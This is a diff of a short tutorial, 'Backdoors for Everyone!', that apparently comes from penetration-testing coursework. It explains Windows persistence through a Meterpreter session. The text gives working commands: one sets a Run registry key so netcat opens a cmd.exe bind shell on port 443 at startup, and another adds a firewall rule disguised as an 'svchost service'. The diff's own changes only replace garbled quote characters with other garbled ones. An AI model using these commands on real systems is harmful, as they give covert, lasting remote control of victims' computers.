@@ -1,6 +1,6 @@
 Backdoors for Everyone!
 
-Persistence is another thing we are concerned about when wanting to maintain current access in the box. Wilhelm states, ìOur original compromise of the system may become blocked through system patching or network changes preventing us from exploiting the system whenever we need access.î(Wilhelm 387). I will explain how to be persistent and setup a netcat back door.
+Persistence is another thing we are concerned about when wanting to maintain current access in the box. Wilhelm states, ‚ÄúOur original compromise of the system may become blocked through system patching or network changes preventing us from exploiting the system whenever we need access.‚Äù(Wilhelm 387). I will explain how to be persistent and setup a netcat back door.
 
 First we need to get a Meterpreter session like before, once we have that we can then upload the backdoor with is netcat a program that writes and reads from sockets.
 
@@ -12,7 +12,7 @@ reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
 Then we add netcat into the startup process.
 reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe'
 
-Next we configure the computer to allow remote connections outside the victimís box through 443:
+Next we configure the computer to allow remote connections outside the victim‚Äôs box through 443:
 
 netsh advfirewall firewall add rule name="svchost service" dir=in action=allow protocol=TCP localport=443
 
